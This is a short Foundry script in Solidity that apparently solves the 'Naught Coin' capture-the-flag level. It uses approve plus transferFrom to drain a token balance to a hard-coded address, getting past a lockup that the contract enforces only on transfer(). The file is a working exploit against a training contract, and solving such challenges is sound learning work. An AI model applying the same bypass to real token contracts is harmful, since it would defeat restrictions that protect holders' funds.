// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "forge-std/interfaces/IERC20.sol";

address constant INSTANCE = 0x57E875A13483b12b77b653fe8F2114Aa94DC6977;

contract NaughtCoinPOCScript is Script {
    function run() external {
        vm.startBroadcast();

        IERC20 token = IERC20(INSTANCE);
        token.approve(msg.sender, token.balanceOf(msg.sender));
        token.transferFrom(msg.sender, 0x9fdD78B4b4CCE5Ac454f621DBF86341F7FA0560C, token.balanceOf(msg.sender));

        assert(token.balanceOf(msg.sender) == 0);

        vm.stopBroadcast();
    }
}
